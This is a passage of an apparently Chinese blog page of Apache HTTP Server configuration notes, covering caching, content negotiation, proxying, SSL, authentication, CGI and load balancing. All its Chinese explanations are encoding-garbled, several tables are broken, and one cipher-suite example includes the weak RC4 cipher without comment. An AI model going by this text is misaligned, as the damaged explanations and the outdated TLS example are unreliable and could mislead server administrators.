class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><table><thead><tr><th>å±æ€§å</th><th>æ„ä¹‰</th></tr></thead><tbody><tr><td><code>CacheRoot</code></td><td>å­˜æ”¾ç¼“å­˜æ–‡ä»¶çš„æ ¹ç›®å½•</td></tr><tr><td><code>CacheDirLength</code></td><td>å­ç›®å½•åç§°ä¸­çš„å­—ç¬¦æ•°</td></tr><tr><td><code>CacheDirLevels</code></td><td>ç¼“å­˜ä¸­å­ç›®å½•çš„çº§åˆ«æ•°</td></tr><tr><td><code>CacheMaxFileSize</code></td><td>è¦æ”¾ç½®åœ¨ç¼“å­˜ä¸­çš„æ–‡æ¡£çš„æœ€å¤§å¤§å°ï¼ˆä»¥å­—èŠ‚ä¸ºå•ä½ï¼‰</td></tr><tr><td><code>CacheReadSize</code></td><td>åœ¨å‘ä¸‹æ¸¸å‘é€æ•°æ®ä¹‹å‰è¦è¯»å–å’Œç¼“å­˜çš„æ–‡æ¡£çš„æœ€å°å¤§å°ï¼ˆä»¥å­—èŠ‚ä¸ºå•ä½ï¼‰</td></tr><tr><td><code>CacheReadTime</code></td><td>åœ¨å‘ä¸‹æ¸¸å‘é€æ•°æ®ä¹‹å‰è¯»å–æ—¶åº”ç»è¿‡çš„æœ€çŸ­æ—¶é—´ï¼ˆä»¥æ¯«ç§’ä¸ºå•ä½ï¼‰</td></tr><tr><td><code>CacheEnable cache_type [url-string]</code></td><td>ä½¿ç”¨æŒ‡å®šçš„å­˜å‚¨ç®¡ç†å™¨å¯ç”¨æŒ‡å®š URL çš„ç¼“å­˜</td></tr><tr><td><code>CacheSocache type[:args]</code></td><td>è¦ä½¿ç”¨çš„å…±äº«å¯¹è±¡ç¼“å­˜å®ç°</td></tr><tr><td><code>CacheDisable</code></td><td>ç¦ç”¨æŒ‡å®š URL çš„ç¼“å­˜</td></tr><tr><td>â€¦</td><td></td></tr></tbody></table><h3 id="å†…å®¹åå•†"><a href="#å†…å®¹åå•†" class="headerlink" title="å†…å®¹åå•†"></a>å†…å®¹åå•†</h3><h4 id="ä½¿ç”¨ç±»å‹æ˜ å°„æ–‡ä»¶"><a href="#ä½¿ç”¨ç±»å‹æ˜ å°„æ–‡ä»¶" class="headerlink" title="ä½¿ç”¨ç±»å‹æ˜ å°„æ–‡ä»¶"></a>ä½¿ç”¨ç±»å‹æ˜ å°„æ–‡ä»¶</h4><pre class="line-numbers language-config" data-language="config"><code class="language-config">AddHandler type-map .var<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ç±»å‹æ˜ å°„æ–‡ä»¶åº”ä¸å…¶æè¿°çš„èµ„æºå…·æœ‰ç›¸åŒçš„åç§°ï¼Œåè·Ÿæ‰©å±•å<code>.var</code>.åœ¨ä¸‹é¢æ˜¾ç¤ºçš„ç¤ºä¾‹ä¸­ï¼Œèµ„æºåä¸º<code>foo</code>ï¼Œå› æ­¤ç±»å‹æ˜ å°„æ–‡ä»¶åä¸º<code>foo.var</code></p><pre class="line-numbers language-config" data-language="config"><code class="language-config">URI: fooURI: foo.en.htmlContent-type: text/htmlContent-language: enURI: foo.fr.de.htmlContent-type: text/html;charset=iso-8859-2Content-language: fr, de<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-config" data-language="config"><code class="language-config">URI: fooURI: foo.jpegContent-type: image/jpeg; qs=0.8URI: foo.gifContent-type: image/gif; qs=0.5URI: foo.txtContent-type: text/plain; qs=0.01<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-config" data-language="config"><code class="language-config">URI: document.htmlContent-language: enContent-type: text/htmlURI: document.html.enContent-language: frContent-type: text/htmlURI: document.html.frContent-language: deContent-type: text/htmlURI: document.html.de<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿™ä¸‰æ®µä»£ç éƒ½æ˜¯<code>type-map</code></p><table><thead><tr><th>å±æ€§å</th><th>æ„ä¹‰</th></tr></thead><tbody><tr><td><code>URI: document.html</code></td><td>èµ„æºå</td></tr><tr><td><code>Content-type</code></td><td>èµ„æºç±»å‹</td></tr><tr><td><code>Content-language</code></td><td>èµ„æºè¯­è¨€</td></tr><tr><td><code>qs</code></td><td>æƒé‡</td></tr><tr><td><code>AddHandler type-map .var</code></td><td>ä¸åä¸º<code>type-map</code>çš„å¤„ç†ç¨‹åºå…³è”</td></tr><tr><td><code>.var</code></td><td>ç›¸å½“<code>*</code>çš„åŒ¹é…å€¼</td></tr><tr><td>â€¦</td><td></td></tr></tbody></table><h4 id="Multiviews"><a href="#Multiviews" class="headerlink" title="Multiviews"></a>Multiviews</h4><p>å¦‚æœæœåŠ¡å™¨æ”¶åˆ°<code>/some/dir/foo</code>çš„è¯·æ±‚ï¼Œå¦‚æœ<code>/some/dir</code>å¯ç”¨äº†MultiViewsï¼Œå¹¶ä¸”<code>/some/dir/foo</code>ä¸å­˜åœ¨ï¼Œé‚£ä¹ˆæœåŠ¡å™¨ä¼šè¯»å–å¯»æ‰¾çš„ç›®å½•åä¸º<code>foo.*</code>çš„æ–‡ä»¶</p><h3 id="ä»-URL-æ˜ å°„åˆ°æ–‡ä»¶ç³»ç»Ÿ"><a href="#ä»-URL-æ˜ å°„åˆ°æ–‡ä»¶ç³»ç»Ÿ" class="headerlink" title="ä» URL æ˜ å°„åˆ°æ–‡ä»¶ç³»ç»Ÿ"></a>ä» URL æ˜ å°„åˆ°æ–‡ä»¶ç³»ç»Ÿ</h3><p>Apache HTTP Server ä½¿ç”¨è¯·æ±‚çš„ URL æ¥ç¡®å®šæä¾›æ–‡ä»¶çš„æ–‡ä»¶ç³»ç»Ÿä½ç½®</p><pre class="line-numbers language-config" data-language="config"><code class="language-config">ProxyPass         "/mirror/foo/" "http://backend.example.com/"ProxyPassReverse  "/mirror/foo/" "http://backend.example.com/"ProxyPassReverseCookieDomain  "backend.example.com"  "public.example.com"ProxyPassReverseCookiePath  "/"  "/mirror/foo/"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><table><thead><tr><th>å±æ€§å</th><th>æ„ä¹‰</th></tr></thead><tbody><tr><td>`Alias [URL-path] file-path</td><td>directory-path`</td></tr><tr><td><code>Alias "/docs" "/var/web"</code></td><td>ç½‘å€ <code>http://www.example.com/docs/dir/file.html</code> å°†ä»<code>/var/web/dir/file.html</code>æä¾›</td></tr><tr><td>`AliasMatch regex file-path</td><td>directory-path`</td></tr><tr><td><code>AliasMatch "^/icons(/$)(.*)" "/usr/local/apache/icons$1$2"</code></td><td></td></tr><tr><td>`CheckSpelling on</td><td>off`</td></tr><tr><td><code>DirectoryIndex disabled local-url [local-url] ...</code></td><td>å®¢æˆ·ç«¯è¯·æ±‚ç›®å½•æ—¶è¦æŸ¥æ‰¾çš„èµ„æºåˆ—è¡¨</td></tr><tr><td><code>DocumentRoot </code></td><td></td></tr><tr><td><code>ErrorDocument 404 /errors/bad_urls.php</code></td><td>å‘ç”Ÿé”™è¯¯æ—¶æœåŠ¡å™¨å°†è¿”å›ç»™å®¢æˆ·ç«¯çš„å†…å®¹</td></tr><tr><td><code>Options</code></td><td></td></tr><tr><td><code>ProxyPass "/mirror/foo/" "http://backend.example.com/"</code></td><td>å°†è¿œç¨‹æœåŠ¡å™¨æ˜ å°„åˆ°æœ¬åœ°æœåŠ¡å™¨ URL ç©ºé—´</td></tr><tr><td><code>ProxyPassReverse [path] url [interpolate]</code></td><td>è°ƒæ•´ä»åå‘ä»£ç†æœåŠ¡å™¨å‘é€çš„ HTTP å“åº”æ ‡å¤´ä¸­çš„ URL</td></tr><tr><td><code>ProxyPassReverseCookieDomain internal-domain public-domain [interpolate]</code></td><td>ä»åå‘ä»£ç†æœåŠ¡å™¨è°ƒæ•´ Set-Cookie æ ‡å¤´ä¸­çš„åŸŸå­—ç¬¦ä¸²</td></tr><tr><td><code>ProxyPassReverseCookiePath internal-path public-path [interpolate]</code></td><td>è°ƒæ•´æ¥è‡ªåå‘ä»£ç†æœåŠ¡å™¨çš„ Set-Cookie æ ‡å¤´ä¸­çš„ Path å­—ç¬¦ä¸²</td></tr><tr><td><code>Redirect [status] [URL-path] URL</code></td><td>å‘é€å¤–éƒ¨é‡å®šå‘è¯·æ±‚å®¢æˆ·ç«¯è·å–ä¸åŒçš„ URL</td></tr><tr><td><code>Redirect 303 "/three" "http://example.com/other"</code></td><td></td></tr><tr><td><code>RedirectMatch [status] regex URL</code></td><td>æ ¹æ®å½“å‰ URL çš„æ­£åˆ™è¡¨è¾¾å¼åŒ¹é…å‘é€å¤–éƒ¨é‡å®šå‘</td></tr><tr><td><code>RewriteCond TestString CondPattern [flags]</code></td><td>å®šä¹‰é‡å†™å‘ç”Ÿçš„æ¡ä»¶</td></tr><tr><td><code>RewriteRule Pattern Substitution [flags]</code></td><td>å®šä¹‰é‡å†™å¼•æ“çš„è§„åˆ™</td></tr><tr><td>`ScriptAlias [URL-path] file-path</td><td>directory-path`</td></tr><tr><td>`ScriptAliasMatch regex file-path</td><td>directory-path`</td></tr><tr><td><code>UserDir directory-filename [directory-filename] ...</code></td><td>ç”¨æˆ·ç‰¹å®šç›®å½•çš„ä½ç½®</td></tr><tr><td>â€¦</td><td></td></tr></tbody></table><h3 id="å…¨å±€é…ç½®"><a href="#å…¨å±€é…ç½®" class="headerlink" title="å…¨å±€é…ç½®"></a>å…¨å±€é…ç½®</h3><table><thead><tr><th>å±æ€§å</th><th>æ„ä¹‰</th></tr></thead><tbody><tr><td>`ServerName [scheme://]domain-name</td><td>ip-address[:port]`</td></tr><tr><td>`ServerAdmin email-address</td><td>URL`</td></tr><tr><td>`ServerSignature On</td><td>Off</td></tr><tr><td>`ServerTokens Major</td><td>Minor</td></tr><tr><td>`UseCanonicalName On</td><td>Off</td></tr><tr><td>`UseCanonicalPhysicalPort On</td><td>Off`</td></tr><tr><td><code>CoreDumpDirectory directory</code></td><td>Apache HTTP Server åœ¨è½¬å‚¨æ ¸å¿ƒä¹‹å‰å°è¯•åˆ‡æ¢çš„ç›®å½•</td></tr><tr><td><code>DocumentRoot directory-path</code></td><td>æ„æˆ Web ä¸Šå¯è§çš„ä¸»æ–‡æ¡£æ ‘çš„ç›®å½•</td></tr><tr><td>`ErrorLog file-path</td><td>syslog[:[facility]`</td></tr><tr><td>`Mutex mechanism [default</td><td>mutex-name] â€¦ [OmitPID]`</td></tr><tr><td><code>PidFile filename</code></td><td>æœåŠ¡å™¨è®°å½•å®ˆæŠ¤è¿›ç¨‹è¿›ç¨‹IDçš„æ–‡ä»¶</td></tr><tr><td><code>ScoreBoardFile file-path</code></td><td>ç”¨äºå­˜å‚¨å­è¿›ç¨‹çš„åè°ƒæ•°æ®çš„æ–‡ä»¶çš„ä½ç½®</td></tr><tr><td><code>ServerRoot directory-path</code></td><td>æœåŠ¡å™¨å®‰è£…çš„åŸºæœ¬ç›®å½•</td></tr><tr><td><code>LimitRequestBody bytes</code></td><td>é™åˆ¶å®¢æˆ·ç«¯å‘é€çš„ HTTP è¯·æ±‚æ­£æ–‡çš„æ€»å¤§å°</td></tr><tr><td><code>LimitRequestFields number</code></td><td>é™åˆ¶å°†ä»å®¢æˆ·ç«¯æ¥å—çš„ HTTP è¯·æ±‚å¤´å­—æ®µçš„æ•°é‡</td></tr><tr><td><code>LimitRequestFieldSize bytes</code></td><td>é™åˆ¶å®¢æˆ·ç«¯å…è®¸çš„ HTTP è¯·æ±‚å¤´çš„å¤§å°</td></tr><tr><td><code>LimitRequestLine bytes</code></td><td>é™åˆ¶å°†ä»å®¢æˆ·ç«¯æ¥å—çš„ HTTP è¯·æ±‚è¡Œçš„å¤§å°</td></tr><tr><td>`RLimitCPU seconds</td><td>max [seconds</td></tr><tr><td>`RLimitMEM bytes</td><td>max [bytes</td></tr><tr><td>`RLimitNPROC number</td><td>max [number</td></tr><tr><td><code>ThreadStackSize size</code></td><td>å¤„ç†å®¢æˆ·ç«¯è¿æ¥çš„çº¿ç¨‹ä½¿ç”¨çš„å †æ ˆå¤§å°ï¼ˆä»¥å­—èŠ‚ä¸ºå•ä½ï¼‰</td></tr><tr><td>â€¦</td><td></td></tr></tbody></table><h3 id="SSL-TLS-åŠ å¯†"><a href="#SSL-TLS-åŠ å¯†" class="headerlink" title="SSL/TLS åŠ å¯†"></a>SSL/TLS åŠ å¯†</h3><p>an example</p><pre class="line-numbers language-config" data-language="config"><code class="language-config">LoadModule ssl_module modules/mod_ssl.soListen 443&amp;ltVirtualHost *:443&gt;    ServerName www.example.com    SSLEngine on    SSLCertificateFile "/path/to/www.example.com.cert"    SSLCertificateKeyFile "/path/to/www.example.com.key"&amp;lt/VirtualHost&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><table><thead><tr><th>å±æ€§å€¼</th><th>æ„ä¹‰</th></tr></thead><tbody><tr><td><code>SSLEngine on</code></td><td>SSL å¼•æ“æ“ä½œå¼€å…³</td></tr><tr><td>`SSLCertificateFile file-path</td><td>certid`</td></tr><tr><td>`SSLCertificateKeyFile file-path</td><td>keyid`</td></tr><tr><td><code>SSLCipherSuite [protocol] cipher-spec</code></td><td>å¯†ç å¥—ä»¶å¯ç”¨äº SSL æ¡æ‰‹ä¸­çš„åå•†</td></tr><tr><td><code>SSLCipherSuite RC4-SHA:AES128-SHA:HIGH:!aNULL:!MD5</code></td><td></td></tr><tr><td>`SSLHonorCipherOrder on</td><td>off`</td></tr><tr><td><code>SSLUseStapling off</code></td><td>åœ¨ TLS æ¡æ‰‹ä¸­å¯ç”¨ OCSP å“åº”çš„è£…è®¢</td></tr><tr><td><code>SSLStaplingCache "shmcb:logs/ssl_stapling(32768)"</code></td><td>é…ç½® OCSP è£…è®¢ç¼“å­˜</td></tr><tr><td><code>SSLVerifyClient level</code></td><td>å®¢æˆ·ç«¯è¯ä¹¦éªŒè¯ç±»å‹</td></tr><tr><td><code>SSLVerifyDepth number</code></td><td>å®¢æˆ·ç«¯è¯ä¹¦éªŒè¯ä¸­ CA è¯ä¹¦çš„æœ€å¤§æ·±åº¦</td></tr><tr><td><code>SSLCACertificateFile file-path</code></td><td>ç”¨äºå®¢æˆ·ç«¯èº«ä»½éªŒè¯çš„ä¸²è” PEM ç¼–ç  CA è¯ä¹¦æ–‡ä»¶</td></tr><tr><td>`SSLOptions [+</td><td>-]option â€¦`</td></tr><tr><td><code>SSLRequire expression</code></td><td>ä»…å½“ä»»æ„å¤æ‚çš„å¸ƒå°”è¡¨è¾¾å¼ä¸ºçœŸæ—¶æ‰å…è®¸è®¿é—®</td></tr><tr><td>â€¦</td><td></td></tr></tbody></table><h3 id="URLé‡å†™"><a href="#URLé‡å†™" class="headerlink" title="URLé‡å†™"></a>URLé‡å†™</h3><table><thead><tr><th>å±æ€§å</th><th>æ„ä¹‰</th></tr></thead><tbody><tr><td><code>RewriteBase URL-path</code></td><td>è®¾ç½®æ¯ä¸ªç›®å½•é‡å†™çš„åŸºæœ¬ URL</td></tr><tr><td><code>RewriteCond TestString CondPattern [flags]</code></td><td>å®šä¹‰é‡å†™å‘ç”Ÿçš„æ¡ä»¶</td></tr><tr><td><code>RewriteRule Pattern Substitution [flags]</code></td><td>å®šä¹‰é‡å†™å¼•æ“çš„è§„åˆ™</td></tr><tr><td>RewriteEngine on|off</td><td>å¯ç”¨æˆ–ç¦ç”¨è¿è¡Œæ—¶é‡å†™å¼•æ“</td></tr><tr><td>RewriteMap <em>MapName</em> <em>MapType</em>:MapSource [MapTypeOptions]</td><td>å®šä¹‰é”®æŸ¥æ‰¾çš„æ˜ å°„å‡½æ•°</td></tr><tr><td>RewriteOptions Options</td><td>ä¸ºé‡å†™å¼•æ“è®¾ç½®ä¸€äº›ç‰¹æ®Šé€‰é¡¹</td></tr><tr><td>â€¦</td><td></td></tr></tbody></table><h3 id="è®¤è¯å’Œæˆæƒ"><a href="#è®¤è¯å’Œæˆæƒ" class="headerlink" title="è®¤è¯å’Œæˆæƒ"></a>è®¤è¯å’Œæˆæƒ</h3><table><thead><tr><th>å±æ€§å€¼</th><th>æ„ä¹‰</th></tr></thead><tbody><tr><td><code>AllowOverride AuthConfig</code></td><td>.htaccess æ–‡ä»¶ä¸­å…è®¸çš„æŒ‡ä»¤ç±»å‹</td></tr><tr><td>`AuthType None</td><td>Basic</td></tr><tr><td><code>AuthBasicProvider provider-name [provider-name] ...</code></td><td>è®¾ç½®æ­¤ä½ç½®çš„èº«ä»½éªŒè¯æä¾›ç¨‹åº</td></tr><tr><td><code>AuthDigestProvider provider-name [provider-name] ...</code></td><td>è®¾ç½®æ­¤ä½ç½®çš„èº«ä»½éªŒè¯æä¾›ç¨‹åº</td></tr><tr><td><code>Require [not] entity-name [entity-name] ...</code></td><td>æµ‹è¯•ç»è¿‡èº«ä»½éªŒè¯çš„ç”¨æˆ·æ˜¯å¦ç”±æˆæƒæä¾›è€…æˆæƒ</td></tr><tr><td><code>AuthName auth-domain</code></td><td>ç”¨äº HTTP èº«ä»½éªŒè¯çš„æˆæƒé¢†åŸŸ</td></tr><tr><td><code>AuthUserFile file-path</code></td><td>è®¾ç½®åŒ…å«ç”¨äºèº«ä»½éªŒè¯çš„ç”¨æˆ·å’Œå¯†ç åˆ—è¡¨çš„æ–‡æœ¬æ–‡ä»¶çš„åç§°</td></tr><tr><td><code>AuthDBMUserFile file-path</code></td><td>è®¾ç½®åŒ…å«ç”¨äºèº«ä»½éªŒè¯çš„ç”¨æˆ·å’Œå¯†ç åˆ—è¡¨çš„æ•°æ®åº“æ–‡ä»¶çš„åç§°</td></tr><tr><td><code>AuthGroupFile file-path</code></td><td>è®¾ç½®åŒ…å«æˆæƒç”¨æˆ·ç»„åˆ—è¡¨çš„æ–‡æœ¬æ–‡ä»¶çš„åç§°</td></tr><tr><td>`AuthLDAPURL url [NONE</td><td>SSL</td></tr><tr><td><code>AuthGroupFile file-path</code></td><td>è®¾ç½®åŒ…å«æˆæƒç”¨æˆ·ç»„åˆ—è¡¨çš„æ–‡æœ¬æ–‡ä»¶çš„åç§°</td></tr><tr><td><code>Require valid-user</code></td><td>æ‰€æœ‰æœ‰æ•ˆç”¨æˆ·éƒ½å¯ä»¥è®¿é—®è¯¥èµ„æº</td></tr><tr><td><code>Require user userid [userid] ...</code></td><td>åªæœ‰æŒ‡å®šç”¨æˆ·æ‰èƒ½è®¿é—®èµ„æº</td></tr><tr><td><code>Require group group-name [group-name] ...</code></td><td>åªæœ‰å‘½åç»„ä¸­çš„ç”¨æˆ·æ‰èƒ½è®¿é—®èµ„æº</td></tr><tr><td><code>&amp;ltRequireAll&gt; ... &amp;lt/RequireAll&gt;</code></td><td>é™„ä¸Šä¸€ç»„æˆæƒæŒ‡ä»¤ï¼Œå…¶ä¸­æ²¡æœ‰ä¸€ä¸ªå¿…é¡»å¤±è´¥ï¼Œå¹¶ä¸”è‡³å°‘ä¸€ä¸ªå¿…é¡»æˆåŠŸæ‰èƒ½ä½¿å°é—­æŒ‡ä»¤æˆåŠŸ</td></tr><tr><td><code>&amp;ltRequireAny&gt; ... &amp;lt/RequireAny&gt;</code></td><td>é™„ä¸Šä¸€ç»„æˆæƒæŒ‡ä»¤ï¼Œå…¶ä¸­ä¸€ä¸ªå¿…é¡»æˆåŠŸæ‰èƒ½ä½¿å°é—­æŒ‡ä»¤æˆåŠŸ</td></tr><tr><td><code>&amp;ltRequireNone&gt; ... &amp;lt/RequireNone&gt;</code></td><td>åŒ…å«ä¸€ç»„æˆæƒæŒ‡ä»¤ï¼Œå…¶ä¸­æ²¡æœ‰ä¸€ä¸ªå¿…é¡»æˆåŠŸæ‰èƒ½ä½¿å°é—­æŒ‡ä»¤ä¸å¤±è´¥</td></tr><tr><td>â€¦</td><td></td></tr></tbody></table><h4 id="å¦‚ä½•å·¥ä½œ"><a href="#å¦‚ä½•å·¥ä½œ" class="headerlink" title="å¦‚ä½•å·¥ä½œ"></a>å¦‚ä½•å·¥ä½œ</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">htpasswd <span class="token parameter variable">-c</span> /usr/local/apache/passwd/passwords rbowen<span class="token comment">#åˆ›å»ºæ–‡ä»¶</span>GroupName: rbowen dpitts sungo rshersey<span class="token comment">#åˆ›å»ºä¸€ä¸ªå°†ç»„åä¸è¯¥ç»„ä¸­çš„ç”¨æˆ·åˆ—è¡¨å…³è”çš„ç»„æ–‡ä»¶</span>htpasswd /usr/local/apache/passwd/passwords dpitts<span class="token comment">#å°†ç”¨æˆ·æ·»åŠ åˆ°æ‚¨å·²å­˜åœ¨çš„å¯†ç æ–‡ä»¶</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="ç®€å•ç¤ºä¾‹"><a href="#ç®€å•ç¤ºä¾‹" class="headerlink" title="ç®€å•ç¤ºä¾‹"></a>ç®€å•ç¤ºä¾‹</h4><p>èƒ½æ”¾åœ¨<code>.htaccess</code>ä¸­æˆ–è€…<code>Directory</code>ä¸­</p><pre class="line-numbers language-config" data-language="config"><code class="language-config">AuthType BasicAuthName "Restricted Files"# (Following line optional)AuthBasicProvider fileAuthUserFile "/usr/local/apache/passwd/passwords"Require user rbowen<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="è®©ä¸æ­¢ä¸€ä¸ªäººè¿›æ¥"><a href="#è®©ä¸æ­¢ä¸€ä¸ªäººè¿›æ¥" class="headerlink" title="è®©ä¸æ­¢ä¸€ä¸ªäººè¿›æ¥"></a>è®©ä¸æ­¢ä¸€ä¸ªäººè¿›æ¥</h4><pre class="line-numbers language-config" data-language="config"><code class="language-config">AuthType BasicAuthName "By Invitation Only"# Optional line:AuthBasicProvider fileAuthUserFile "/usr/local/apache/passwd/passwords"AuthGroupFile "/usr/local/apache/passwd/groups"Require group GroupName<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="å¤‡ç”¨å¯†ç å­˜å‚¨"><a href="#å¤‡ç”¨å¯†ç å­˜å‚¨" class="headerlink" title="å¤‡ç”¨å¯†ç å­˜å‚¨"></a>å¤‡ç”¨å¯†ç å­˜å‚¨</h4><pre class="line-numbers language-config" data-language="config"><code class="language-config">&amp;ltDirectory "/www/docs/private"&gt;    AuthName "Private"    AuthType Basic    AuthBasicProvider dbm    AuthDBMUserFile "/www/passwords/passwd.dbm"    Require valid-user&amp;lt/Directory&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="ä½¿ç”¨å¤šä¸ªæä¾›å•†"><a href="#ä½¿ç”¨å¤šä¸ªæä¾›å•†" class="headerlink" title="ä½¿ç”¨å¤šä¸ªæä¾›å•†"></a>ä½¿ç”¨å¤šä¸ªæä¾›å•†</h4><p>ä½¿ç”¨æ–‡ä»¶ç»„æˆæƒå’Œ LDAP ç»„æˆæƒ</p><pre class="line-numbers language-config" data-language="config"><code class="language-config">&amp;ltDirectory "/www/docs/private"&gt;    AuthName "Private"    AuthType Basic    AuthBasicProvider file    AuthUserFile "/usr/local/apache/passwd/passwords"    AuthLDAPURL ldap://ldaphost/o=yourorg    AuthGroupFile "/usr/local/apache/passwd/groups"    Require group GroupName    Require ldap-group cn=mygroup,o=yourorg&amp;lt/Directory&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="CGIä¸åŠ¨æ€å†…å®¹"><a href="#CGIä¸åŠ¨æ€å†…å®¹" class="headerlink" title="CGIä¸åŠ¨æ€å†…å®¹"></a>CGIä¸åŠ¨æ€å†…å®¹</h3><table><thead><tr><th>å±æ€§å</th><th>æ„ä¹‰</th></tr></thead><tbody><tr><td><code>AddHandler cgi-script .cgi</code></td><td>å°†æ–‡ä»¶æ‰©å±•åæ˜ å°„åˆ°æŒ‡å®šçš„å¤„ç†ç¨‹åºï¼ˆæŒ‡å®šæ‹“å±•å.cgiä¸ºCGIæ–‡ä»¶ï¼‰</td></tr><tr><td><code>Options ExecCGI</code></td><td></td></tr><tr><td>`ScriptAlias [URL-path] file-path</td><td>directory-path`</td></tr><tr><td><code>LoadModule cgi_module modules/mod_cgi.so</code></td><td>é…ç½® Apache ä»¥å…è®¸ CGI æ‰§è¡Œ</td></tr><tr><td>`SetHandler handler-name</td><td>none</td></tr><tr><td>â€¦</td><td></td></tr></tbody></table><p>è¦å…è®¸CGIç¨‹åºæ‰§è¡Œç”¨æˆ·ç›®å½•ä¸­ç»“æŸçš„ä»»ä½•æ–‡ä»¶ã€‚<code>.cgi</code></p><pre class="line-numbers language-config" data-language="config"><code class="language-config">&amp;ltDirectory "/home/*/public_html"&gt;    Options +ExecCGI    AddHandler cgi-script .cgi&amp;lt/Directory&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>å¦‚æœæ‚¨å¸Œæœ›æŒ‡å®šç”¨æˆ·ç›®å½•çš„å­ç›®å½•ï¼Œå…¶ä¸­æ‰€æœ‰å†…å®¹éƒ½å°†è¢«è§†ä¸º CGI ç¨‹åºã€‚cgi-bin`</p><pre class="line-numbers language-config" data-language="config"><code class="language-config">&amp;ltDirectory "/home/*/public_html/cgi-bin"&gt;    Options ExecCGI    SetHandler cgi-script&amp;lt/Directory&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="ç¼–å†™CGI"><a href="#ç¼–å†™CGI" class="headerlink" title="ç¼–å†™CGI"></a>ç¼–å†™CGI</h4><p>ä¿å­˜åˆ°åä¸º<code>first.pl</code>çš„æ–‡ä»¶ä¸­ï¼Œå¹¶å°†å…¶æ”¾åœ¨<code>cgi-bin</code>ç›®å½•ä¸­</p><pre class="line-numbers language-none"><code class="language-none">#!/usr/bin/perlprint "Content-type: text/html\n\n";print "Hello, World.";<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>æµè§ˆå™¨è¾“å…¥URLåœ°å€</p><pre class="line-numbers language-config" data-language="config"><code class="language-config">http://www.example.com/cgi-bin/first.pl<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="åå‘ä»£ç†"><a href="#åå‘ä»£ç†" class="headerlink" title="åå‘ä»£ç†"></a>åå‘ä»£ç†</h3><h4 id="ç®€å•çš„åå‘ä»£ç†"><a href="#ç®€å•çš„åå‘ä»£ç†" class="headerlink" title="ç®€å•çš„åå‘ä»£ç†"></a>ç®€å•çš„åå‘ä»£ç†</h4><pre class="line-numbers language-config" data-language="config"><code class="language-config">ProxyPass "/images"  "http://www.example.com/"ProxyPassReverse "/images"  "http://www.example.com/"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>ä»»ä½•ä»¥<code>/images</code>è·¯å¾„å¼€å¤´çš„è¯·æ±‚éƒ½è¢«ä»£ç†åˆ°æŒ‡å®šçš„åç«¯ï¼Œå¦åˆ™å®ƒå°†åœ¨æœ¬åœ°å¤„ç†</p><h4 id="é›†ç¾¤å’Œå‡è¡¡å™¨"><a href="#é›†ç¾¤å’Œå‡è¡¡å™¨" class="headerlink" title="é›†ç¾¤å’Œå‡è¡¡å™¨"></a>é›†ç¾¤å’Œå‡è¡¡å™¨</h4><p>è´Ÿè½½å‡è¡¡å’Œæ•…éšœè½¬ç§»</p><pre class="line-numbers language-config" data-language="config"><code class="language-config">&amp;ltProxy balancer://myset&gt;    BalancerMember http://www2.example.com:8080    BalancerMember http://www3.example.com:8080    ProxySet lbmethod=bytraffic&amp;lt/Proxy&gt;ProxyPass "/images/"  "balancer://myset/"ProxyPassReverse "/images/"  "balancer://myset/"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="å‡è¡¡å™¨å’Œå‡è¡¡å™¨æˆå‘˜é…ç½®"><a href="#å‡è¡¡å™¨å’Œå‡è¡¡å™¨æˆå‘˜é…ç½®" class="headerlink" title="å‡è¡¡å™¨å’Œå‡è¡¡å™¨æˆå‘˜é…ç½®"></a>å‡è¡¡å™¨å’Œå‡è¡¡å™¨æˆå‘˜é…ç½®</h4><pre class="line-numbers language-config" data-language="config"><code class="language-config">&amp;ltProxy balancer://myset&gt;    BalancerMember http://www2.example.com:8080    BalancerMember http://www3.example.com:8080 loadfactor=3 timeout=1    ProxySet lbmethod=bytraffic&amp;lt/Proxy&gt;ProxyPass "/images"  "balancer://myset/"ProxyPassReverse "/images"  "balancer://myset/"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="æ•…éšœè½¬ç§»"><a href="#æ•…éšœè½¬ç§»" class="headerlink" title="æ•…éšœè½¬ç§»"></a>æ•…éšœè½¬ç§»</h4><pre class="line-numbers language-config" data-language="config"><code class="language-config">&amp;ltProxy balancer://myset&gt;    BalancerMember http://www2.example.com:8080    BalancerMember http://www3.example.com:8080 loadfactor=3 timeout=1    BalancerMember http://spare1.example.com:8080 status=+R    BalancerMember http://spare2.example.com:8080 status=+R    BalancerMember http://hstandby.example.com:8080 status=+H    BalancerMember http://bkup1.example.com:8080 